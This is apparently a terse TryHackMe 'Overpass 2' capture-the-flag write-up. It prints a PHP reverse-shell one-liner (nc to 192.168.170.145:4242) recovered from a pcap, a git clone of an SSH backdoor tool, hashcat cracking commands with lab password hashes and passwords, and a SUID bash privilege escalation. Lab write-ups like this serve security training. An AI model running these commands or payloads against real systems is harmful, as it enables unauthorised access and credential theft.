---
title: Overpass 2
description: 'Getting credentials from a pcap file and exploiting a bash binary with SUID permissions'
pubDate: 2020-12-30
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/96141387d9d4a22658f8db0ada67d62d.png'
---

## Wireshark recon
    /development/

    <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

    ,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN. <- ROT47
        [{"name":"System","pass":"whenevernoteartinstant"}]

    git clone https://github.com/NinjaJc01/ssh-backdoor


## Shadow file, cracked with `fasttrack` wordlist
    - hashcat -m 1800 --username shadow.hash /usr/share/wordlists/fasttrack.txt
        paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:secuirty3
        szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:abcd123
        bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:secret12
        muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:1qaz2wsx


## Backdoor.hash (hash:salt)
    - hashcat -m 1710 backdoor.hash /usr/share/wordlists/rockyou.txt
        - november16

## Shell + user
    - ssh -p 2222 10.10.227.161 <- november16

## Root
    - ./.suid_bash -p
